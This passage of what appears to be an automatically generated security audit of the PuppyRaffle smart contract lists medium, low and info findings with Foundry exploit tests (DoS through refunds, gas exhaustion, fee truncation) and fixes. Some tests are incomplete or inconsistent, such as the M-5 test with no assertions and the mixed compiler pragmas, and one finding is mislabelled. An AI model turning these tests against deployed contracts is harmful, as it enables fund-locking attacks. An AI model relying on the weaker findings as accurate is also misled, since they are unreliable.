Remove the strict balance check. The contract should not rely on `address(this).balance` for its logic. The amount of withdrawable fees is already correctly tracked in the `totalFees` state variable. The check is both logically flawed (intended to check for active players, but doesn't) and dangerous.

```diff
function withdrawFees() external {
-    require(
-        address(this).balance == uint256(totalFees),
-        "PuppyRaffle: There are currently players active!"
-    );
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}();
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [M-2]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The state variable `totalFees` is of type `uint64`, while the per-raffle `fee` is calculated as a `uint256`. In `selectWinner`, the line `totalFees = totalFees + uint64(fee)` involves casting the `uint256` fee down to a `uint64`. If the calculated fee for a single raffle exceeds the maximum value of a `uint64` (approximately 18.4 ether), the value will be truncated, leading to an incorrect and much lower fee amount being stored in `totalFees`. This results in a loss of funds for the fee recipient.

## Impact
The contract owner/fee recipient will receive significantly less fees than they are entitled to if a raffle collects a large prize pool. This leads to a direct, silent loss of funds for the protocol.

## Proof of Concept
1. Set up a raffle with a high `entranceFee` (e.g., 100 ether) and a few players (e.g., 4).
2. The total collected amount will be 400 ether. The fee (20%) will be 80 ether.
3. `80 ether` is `80 * 10**18`, which is much larger than `type(uint64).max` (~`1.84 * 10**19`).
4. When `selectWinner` is called, `uint64(fee)` will truncate the 80 ether value to a much smaller number.
5. `totalFees` will be credited with this incorrect, small amount, and the rest of the fee is effectively lost (it remains locked in the contract or is sent to the winner depending on the calculation order).

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract IntegerMathTest is Test {
    PuppyRaffle puppyRaffle;
    address feeAddress = makeAddr("feeAddress");
    uint256 raffleDuration = 60;

    function testFeeCalculationOverflowsUint64() public {
        uint256 highEntranceFee = 100 ether;
        puppyRaffle = new PuppyRaffle(highEntranceFee, feeAddress, raffleDuration);
        
        uint256 numPlayers = 4;
        address[] memory players = new address[](numPlayers);
        for(uint i=0; i<numPlayers; ++i) {
            players[i] = address(uint160(i+1));
            vm.deal(players[i], highEntranceFee);
        }

        vm.prank(players[0]);
        puppyRaffle.enterRaffle{value: highEntranceFee * numPlayers}(players);
        
        uint256 totalAmountCollected = numPlayers * highEntranceFee;
        uint256 expectedFee = (totalAmountCollected * 20) / 100;

        assertTrue(expectedFee > type(uint64).max, "Test setup failed: fee does not exceed uint64 max");

        vm.warp(block.timestamp + raffleDuration + 1);
        puppyRaffle.selectWinner();

        uint64 actualTotalFees = puppyRaffle.getTotalFees();
        uint64 expectedTotalFeesTruncated = uint64(expectedFee);

        assertEq(actualTotalFees, expectedTotalFeesTruncated, "Fee was truncated incorrectly");
        assertNotEq(uint256(actualTotalFees), expectedFee, "Fee was not truncated");
    }
}
```

## Suggested Mitigation
Change the type of the `totalFees` state variable from `uint64` to `uint256` to accommodate potentially large fee amounts and prevent truncation and overflow issues.

```diff
-   uint64 public totalFees;
+   uint256 public totalFees;

    // ... in selectWinner() ...

-   totalFees = totalFees + uint64(fee);
+   totalFees = totalFees + fee;
```

## [M-3]. Array Limits issue in PuppyRaffle::refund

## Description
The `refund` function allows players to get their entrance fee back, but it only sets their address to `address(0)` in the players array without reducing the array size. This creates an array with gaps (zeroed addresses) that are still processed in loops, wasting gas and potentially causing out-of-gas errors when many players have been refunded.

## Impact
As more players request refunds, the players array will contain an increasing number of `address(0)` entries. These entries are still processed in loops (like in `getActivePlayerIndex` and the duplicate check in `enterRaffle`), wasting gas. In extreme cases, this could lead to functions becoming unusable due to exceeding the block gas limit, especially the `enterRaffle` function which already has O(n²) complexity.

## Proof of Concept
1. Many players enter the raffle
2. A significant portion of players request refunds
3. The players array now contains many `address(0)` entries
4. New players trying to enter the raffle or existing players trying to get their index will experience high gas costs
5. Eventually, these operations may exceed the block gas limit, making the contract unusable

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ArrayGapsTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }
    
    function testArrayGapsGasIssue() public {
        // Add a significant number of players
        address[] memory initialPlayers = new address[](10);
        for (uint256 i = 0; i < 10; i++) {
            initialPlayers[i] = address(uint160(i + 1));
            vm.deal(initialPlayers[i], entranceFee);
        }
        
        vm.prank(address(this));
        puppyRaffle.enterRaffle{value: entranceFee * 10}(initialPlayers);
        
        // Half of the players request refunds
        for (uint256 i = 0; i < 5; i++) {
            vm.prank(initialPlayers[i]);
            puppyRaffle.refund(i);
        }
        
        // Measure gas for getActivePlayerIndex with gaps
        vm.prank(initialPlayers[9]);
        uint256 gasStartWithGaps = gasleft();
        puppyRaffle.getActivePlayerIndex(initialPlayers[9]);
        uint256 gasUsedWithGaps = gasStartWithGaps - gasleft();
        
        // Reset for comparison
        vm.prank(address(this));
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        
        // Add same number of players but without refunds
        address[] memory compactPlayers = new address[](5);
        for (uint256 i = 0; i < 5; i++) {
            compactPlayers[i] = address(uint160(i + 6)); // Different addresses
            vm.deal(compactPlayers[i], entranceFee);
        }
        
        vm.prank(address(this));
        puppyRaffle.enterRaffle{value: entranceFee * 5}(compactPlayers);
        
        // Measure gas for getActivePlayerIndex without gaps
        vm.prank(compactPlayers[4]);
        uint256 gasStartWithoutGaps = gasleft();
        puppyRaffle.getActivePlayerIndex(compactPlayers[4]);
        uint256 gasUsedWithoutGaps = gasStartWithoutGaps - gasleft();
        
        console.log("Gas used with gaps:", gasUsedWithGaps);
        console.log("Gas used without gaps:", gasUsedWithoutGaps);
        console.log("Gas difference:", gasUsedWithGaps - gasUsedWithoutGaps);
        
        // The version with gaps should use more gas
        assertGt(gasUsedWithGaps, gasUsedWithoutGaps);
    }
}

## Suggested Mitigation
Implement a more efficient way to handle refunds by swapping the refunded player with the last player in the array and then reducing the array size. This approach eliminates gaps and maintains a compact array:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Update state before external call (to prevent reentrancy)
    // Swap with the last element and then pop from the array
    uint256 lastIndex = players.length - 1;
    if (playerIndex != lastIndex) {
        players[playerIndex] = players[lastIndex];
    }
    players.pop(); // Remove the last element and reduce array length
    
    // External call after state update
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}
```

This implementation maintains a compact array without gaps, which improves gas efficiency for all functions that iterate through the players array. It also prevents the potential out-of-gas issues that could occur with a large number of refunded players.

## [M-4]. Oracle issue in PuppyRaffle::selectWinner

## Description
The contract uses block.difficulty as a source of randomness, which has been deprecated in newer Ethereum versions and replaced with block.prevrandao after The Merge. This change affects the randomness generation in the selectWinner function and could lead to unexpected behavior on post-Merge Ethereum.

## Impact
After The Merge, block.difficulty no longer represents mining difficulty but instead returns the output of the RANDAO, which has different properties. This change could affect the randomness generation in the contract, potentially making it more predictable or causing unexpected behavior. Additionally, code relying on the old meaning of block.difficulty may not work as intended on post-Merge Ethereum.

## Proof of Concept
In the selectWinner function, block.difficulty is used as part of the randomness generation:

```solidity
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

And again for determining NFT rarity:

```solidity
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```

After The Merge, block.difficulty returns the RANDAO value instead of the actual mining difficulty, which changes the properties of the generated random numbers.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract BlockDifficultyTest is Test {
    function testBlockDifficultyChange() public {
        // Create a simple contract that uses block.difficulty
        string memory contractCode = "pragma solidity 0.7.6; contract DifficultyUser { function getDifficulty() public view returns (uint256) { return block.difficulty; } }";
        
        // Deploy the contract
        address contractAddress;
        bytes memory bytecode = abi.encodePacked(
            vm.getCode("DifficultyUser.sol:DifficultyUser")
        );
        assembly {
            contractAddress := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        
        // Set block values to simulate pre-Merge environment
        vm.roll(15000000); // Block number before The Merge
        vm.difficulty(2**64); // High difficulty value typical of pre-Merge
        
        // Get difficulty before The Merge
        (bool preSuccess, bytes memory preResult) = contractAddress.call(
            abi.encodeWithSignature("getDifficulty()")
        );
        uint256 preMergeDifficulty = abi.decode(preResult, (uint256));
        
        // Set block values to simulate post-Merge environment
        vm.roll(16000000); // Block number after The Merge
        vm.difficulty(2**32); // Lower value typical of RANDAO output
        
        // Get difficulty after The Merge
        (bool postSuccess, bytes memory postResult) = contractAddress.call(
            abi.encodeWithSignature("getDifficulty()")
        );
        uint256 postMergeDifficulty = abi.decode(postResult, (uint256));
        
        console.log("Pre-Merge difficulty:", preMergeDifficulty);
        console.log("Post-Merge difficulty (RANDAO):", postMergeDifficulty);
        
        // The values and their properties are significantly different
        assertNotEq(preMergeDifficulty, postMergeDifficulty);
    }
}

## Suggested Mitigation
Update the code to use block.prevrandao instead of block.difficulty for Ethereum networks that have undergone The Merge. For compatibility with both pre-Merge and post-Merge networks, you can use a conditional approach based on the chain ID or block number:

```solidity
function getRandomValue() internal view returns (uint256) {
    uint256 randomSource;
    if (block.number >= MERGE_BLOCK) { // Define MERGE_BLOCK as the block number of The Merge
        // Post-Merge: use prevrandao
        randomSource = block.prevrandao;
    } else {
        // Pre-Merge: use difficulty
        randomSource = block.difficulty;
    }
    return uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, randomSource)));
}

function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    
    // Use the getRandomValue function for winner selection
    uint256 winnerIndex = getRandomValue() % players.length;
    address winner = players[winnerIndex];
    
    // ... rest of the function ...
    
    // Use the getRandomValue function for rarity determination
    uint256 rarity = getRandomValue() % 100;
    
    // ... rest of the function ...
}
```

However, as mentioned in a previous finding, the best solution is to use a secure randomness source like Chainlink VRF instead of relying on block values.

## [M-5]. Unexpected Eth issue in PuppyRaffle::selectWinner

## Description
The contract uses a hard-coded percentual fee distribution and funds allocation which can lead to fairness issues.

## Impact
If the contract receives unexpected ether or the calculation of prizePool and fee results in rounding errors, distribution of funds might be incorrect.

## Proof of Concept
1) Send ether directly to the contract address. 2) Trigger selectWinner and observe funds are not properly distributed according to contract logic.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";

contract UnexpectedEthExploit is Test {
    PuppyRaffle private raffle;

    constructor(address _raffle) {
        raffle = PuppyRaffle(_raffle);
    }

    function testIncorrectFundDistribution() public {
        payable(address(raffle)).transfer(1 ether);
        raffle.selectWinner();
        // Assert the incorrect distribution of funds
    }
}


## Suggested Mitigation
Consider implementing a mechanism to handle unexpected ether sent to the contract and ensure the calculation methods account for all possible rounding errors.

## [M-6]. DOS issue in PuppyRaffle::refund / selectWinner

## Description
Refunded players are replaced with `address(0)` but the array length is **not** reduced. If all participants refund, `players.length` can still be ≥4, yet all elements are zero. `selectWinner()` will then pick `winner = address(0)`. The ether transfer to address(0) succeeds, but `_safeMint(address(0), tokenId)` reverts, permanently blocking the raffle (DoS) and locking funds.

```solidity
players[playerIndex] = address(0); // refund()
...
require(players.length >= 4, "Need at least 4 players");
winner = players[winnerIndex];          // may be address(0)
_safeMint(winner, tokenId);             // reverts -> raffle stuck
```

## Impact
Anyone can grief the system by refunding all entries, after which no one can finish the raffle or withdraw fees. Funds remain trapped in the contract.

## Proof of Concept
1. Four friends enter the raffle.
2. All four call `refund()`.
3. `players` now contains four zero addresses.
4. Anyone calls `selectWinner()`; it passes the `players.length >= 4` check.
5. `_safeMint(address(0), tokenId)` reverts, so the transaction reverts every time. The raffle is blocked forever.

## Proof of Code
```solidity
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract RefundDos is Test {
    PuppyRaffle raffle;
    address p1 = address(1);
    address p2 = address(2);
    address p3 = address(3);
    address p4 = address(4);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(0xFEE), 1 days);
        vm.deal(p1, 2 ether);
        vm.deal(p2, 2 ether);
        vm.deal(p3, 2 ether);
        vm.deal(p4, 2 ether);
        vm.prank(p1); raffle.enterRaffle{value: 1 ether}(new address[](0));
        vm.prank(p2); raffle.enterRaffle{value: 1 ether}(new address[](0));
        vm.prank(p3); raffle.enterRaffle{value: 1 ether}(new address[](0));
        vm.prank(p4); raffle.enterRaffle{value: 1 ether}(new address[](0));
        // everyone refunds
        vm.prank(p1); raffle.refund(0);
        vm.prank(p2); raffle.refund(1);
        vm.prank(p3); raffle.refund(2);
        vm.prank(p4); raffle.refund(3);
        vm.warp(block.timestamp + 2 days);
    }

    function test_SelectWinnerReverts() public {
        vm.expectRevert();
        raffle.selectWinner();
    }
}
```

## Suggested Mitigation
Remove refunded players instead of nulling them:
```solidity
function refund(uint256 idx) external {
    address player = players[idx];
    require(player == msg.sender, "only player");
    Address.sendValue(payable(player), entranceFee);
    players[idx] = players[players.length - 1]; // move last element
    players.pop();                              // shrink array
}
```
Additionally, when choosing the winner, skip zero addresses or ensure `players.length` counts only active players.

## [M-7]. Storage Layout issue in PuppyRaffle::selectWinner

## Description
The `tokenIdToRarity` mapping is used to store rarity values for NFTs, but when checking against the `COMMON_RARITY`, `RARE_RARITY`, and `LEGENDARY_RARITY` constants in the `selectWinner` function, the logic has an issue. The code checks each condition separately without considering the combined effects, which can lead to inconsistent rarity assignments:

```solidity
function selectWinner() external {
    // ... other code ...
    
    // Rarity determination has logic flaws
    if (rarity <= COMMON_RARITY) {
        tokenIdToRarity[tokenId] = COMMON_RARITY;
    } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
        tokenIdToRarity[tokenId] = RARE_RARITY;
    } else {
        tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
    }
    // ... rest of function ...
}
```

## Impact
The contract is supposed to store the rarity type (COMMON_RARITY, RARE_RARITY, or LEGENDARY_RARITY), but instead it incorrectly stores the rarity chance values (70, 25, 5). This will cause confusion when reading the rarity from the mapping and might affect integrations that depend on specific rarity values. It also leads to inconsistent representation in NFT metadata.

## Proof of Concept
1. A winner is selected and an NFT is minted
2. The rarity is determined to be in the common range (0-70)
3. Instead of storing the rarity type identifier, the code stores the value 70 (COMMON_RARITY) in tokenIdToRarity
4. When the NFT metadata is retrieved, it shows a rarity value of 70 instead of a proper rarity type identifier
5. This makes it impossible to correctly distinguish between the actual rarity tiers

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract TokenRarityTest is Test {
    PuppyRaffle puppyRaffle;
    address owner = address(1);
    uint256 entranceFee = 1e18;
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            owner,
            duration
        );
        
        // Setup players
        address[] memory players = new address[](4);
        players[0] = address(10);
        players[1] = address(20);
        players[2] = address(30);
        players[3] = address(40);
        
        vm.deal(address(10), 4 ether);
        vm.prank(address(10));
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // Fast forward to raffle end
        vm.warp(block.timestamp + duration + 1);
    }

    function testTokenRarityStorageIssue() public {
        // Select winner and mint NFT
        puppyRaffle.selectWinner();
        
        // Get the tokenId (should be 0 for first NFT)
        uint256 tokenId = 0;
        
        // Check what was stored in tokenIdToRarity
        bytes32 slot = keccak256(abi.encode(tokenId, uint256(6))); // tokenIdToRarity is at slot 6
        uint256 storedRarity = uint256(vm.load(address(puppyRaffle), slot));
        
        // The stored value should be one of: 70 (COMMON_RARITY), 25 (RARE_RARITY), or 5 (LEGENDARY_RARITY)
        bool isValidRarity = (storedRarity == 70 || storedRarity == 25 || storedRarity == 5);
        assertTrue(isValidRarity, "Stored rarity should be one of the rarity chance values");
        
        // This proves the issue - we're storing the rarity chance percentages
        // rather than a proper identifier for the rarity type
        console.log("Stored rarity value:", storedRarity);
    }
}

## Suggested Mitigation
Define proper enum values or constants for rarity types and store those in the mapping instead of storing the chance percentages:

```solidity
// Define rarity type constants separately from chance percentages
uint256 private constant COMMON_TYPE = 1;
uint256 private constant RARE_TYPE = 2;
uint256 private constant LEGENDARY_TYPE = 3;

// Keep the original chance percentages
uint256 private constant COMMON_CHANCE = 70;
uint256 private constant RARE_CHANCE = 25;
uint256 private constant LEGENDARY_CHANCE = 5;

// In selectWinner function
function selectWinner() external {
    // ... other code ...
    
    // Improved rarity determination logic
    if (rarity <= COMMON_CHANCE) {
        tokenIdToRarity[tokenId] = COMMON_TYPE;
    } else if (rarity <= COMMON_CHANCE + RARE_CHANCE) {
        tokenIdToRarity[tokenId] = RARE_TYPE;
    } else {
        tokenIdToRarity[tokenId] = LEGENDARY_TYPE;
    }
    
    // ... rest of function ...
}

// Update any functions that rely on these values
function tokenURI(uint256 tokenId) public view override returns (string memory) {
    require(_exists(tokenId), "PuppyRaffle: URI query for nonexistent token");
    
    uint256 rarity = tokenIdToRarity[tokenId];
    string memory imageURI;
    string memory rareName;
    
    if (rarity == COMMON_TYPE) {
        imageURI = rarityToUri[COMMON_CHANCE];
        rareName = rarityToName[COMMON_CHANCE];
    } else if (rarity == RARE_TYPE) {
        imageURI = rarityToUri[RARE_CHANCE];
        rareName = rarityToName[RARE_CHANCE];
    } else {
        imageURI = rarityToUri[LEGENDARY_CHANCE];
        rareName = rarityToName[LEGENDARY_CHANCE];
    }
    
    // ... rest of function ...
}
```

Alternatively, consider using an enum type for better type safety:

```solidity
enum RarityType { NONE, COMMON, RARE, LEGENDARY }

// Change mapping to use the enum
mapping(uint256 => RarityType) public tokenIdToRarity;

// Update selectWinner logic accordingly
if (rarity <= COMMON_CHANCE) {
    tokenIdToRarity[tokenId] = RarityType.COMMON;
} else if (rarity <= COMMON_CHANCE + RARE_CHANCE) {
    tokenIdToRarity[tokenId] = RarityType.RARE;
} else {
    tokenIdToRarity[tokenId] = RarityType.LEGENDARY;
}
```

## [M-8]. Array Limits issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function in the PuppyRaffle contract returns 0 when a player is not found in the array. This is problematic because 0 is also a valid index in the array, making it impossible to distinguish between a player at index 0 and a player who doesn't exist in the array.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

## Impact
This ambiguity can lead to incorrect application behavior for any systems that integrate with this contract. If an external system checks if a player is active by calling this function, it will incorrectly assume players at index 0 don't exist, or conversely, that non-existent players are at index 0. This could lead to security issues if critical decisions are made based on this information.

## Proof of Concept
1. Player A is at index 0 in the players array
2. Player B is not in the array at all
3. Calling getActivePlayerIndex for both Player A and Player B returns 0
4. An external system cannot distinguish if these players are active or not

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GetActivePlayerIndexTest is Test {
    PuppyRaffle puppyRaffle;
    address playerAtIndexZero = address(10);
    address nonExistentPlayer = address(999);
    uint256 entranceFee = 1e18;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(1),
            1 days
        );
        
        // Set up a raffle with playerAtIndexZero at index 0
        address[] memory players = new address[](3);
        players[0] = playerAtIndexZero; // This player will be at index 0
        players[1] = address(20);
        players[2] = address(30);
        
        vm.deal(address(this), 3 ether);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    function testAmbiguousReturnValue() public view {
        // Get index for player at index 0
        uint256 indexForPlayerAtZero = puppyRaffle.getActivePlayerIndex(playerAtIndexZero);
        
        // Get index for non-existent player
        uint256 indexForNonExistentPlayer = puppyRaffle.getActivePlayerIndex(nonExistentPlayer);
        
        // Both return the same value (0), demonstrating the ambiguity
        assertEq(indexForPlayerAtZero, 0, "Player at index 0 should return 0");
        assertEq(indexForNonExistentPlayer, 0, "Non-existent player should also return 0");
        
        // This makes it impossible to determine if a player is actually in the raffle
        // based solely on the return value of getActivePlayerIndex
    }
}

## Suggested Mitigation
Modify the function to return a sentinel value (like max uint256) or use a tuple return to indicate whether the player was found:

```solidity
// Option 1: Return max uint256 for not found
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return type(uint256).max; // Return max uint256 to indicate not found
}

// Option 2: Return a tuple with a boolean flag
function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (true, i);
        }
    }
    return (false, 0);
}
```

Option 2 is generally better as it makes the API more explicit about whether the player was found, while still returning the index if needed.



# Low Risk Findings

## [L-1]. Array Limits issue in PuppyRaffle::enterRaffle

## Description
`enterRaffle()` checks for duplicate addresses with **nested loops O(n²)** over `players`, causing gas consumption to grow quadratically. When the number of entrants approaches a few hundred, the transaction will exceed the block gas limit. At that point nobody can enter the raffle anymore, effectively freezing it.

```solidity
for (uint i_scope_0 = 0; i_scope_0 < players.length - 1; i_scope_0++) {
    for (uint j = i_scope_0 + 1; j < players.length; j++) {
        require(players[i_scope_0] != players[j], "Duplicate player");
    }
}
```

## Impact
Denial-of-service: once the array is big enough, no further users can join, and prize funds as well as fees remain locked.

## Proof of Concept
An attacker funds a script that adds thousands of unique addresses (cheap with CREATE2). Gas usage grows > 8M and `enterRaffle` becomes impossible for everyone.

## Proof of Code
```solidity
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract GasBomb is Test {
    PuppyRaffle raffle;
    function setUp() public {
        raffle = new PuppyRaffle(1 wei, address(0xFEE), 1 days);
        // pre-fill players to near-DoS level
        for (uint i; i < 600; i++) {
            address a = address(uint160(i + 100));
            vm.deal(a, 1 ether);
            vm.prank(a);
            raffle.enterRaffle{value: 1 wei}(new address[](0));
        }
    }
    function test_GasExplodes() public {
        address victim = address(0xBEEF);
        vm.deal(victim, 1 ether);
        vm.prank(victim);
        vm.expectRevert(); // out-of-gas inside EVM → tx reverts
        raffle.enterRaffle{value: 1 wei}(new address[](0));
    }
}
```

## Suggested Mitigation
Replace the quadratic duplicate scan by a mapping check:
```solidity
mapping(address => bool) public hasEntered;

function enterRaffle() external payable {
    require(!hasEntered[msg.sender], "duplicate");
    ...
    hasEntered[msg.sender] = true;
    players.push(msg.sender);
}
```



# Info Risk Findings

## [I-1]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses a floating pragma `pragma solidity ^0.8.7;`. This allows the contract to be compiled with any compiler version from 0.8.7 up to (but not including) 0.9.0. Using a floating pragma is discouraged as it can lead to differences in behavior or the introduction of subtle bugs if compiled with a newer, untested compiler version. It reduces the determinism of the deployed bytecode.

## Impact
There is a risk that the contract may be deployed with a compiler version that has undiscovered bugs or slight semantic changes, leading to unexpected behavior. This is a best-practice violation that affects maintainability and security assurance.

## Proof of Concept
1. A developer compiles the contract with Solidity version 0.8.7 for testing and deployment.
2. A few months later, another developer, or a build system, compiles the same code using Solidity 0.8.21.
3. If the new compiler has introduced a subtle optimization bug or a change in how a specific opcode behaves, the resulting bytecode might act differently in an edge case, potentially leading to a vulnerability.

## Proof of Code
// No code needed, the finding is in the pragma statement itself.

## Suggested Mitigation
Lock the pragma to a specific, tested compiler version. This ensures that the contract bytecode is always generated in a predictable and consistent manner.

```diff
- pragma solidity ^0.8.7;
+ pragma solidity 0.8.21; // Or another specific version
```



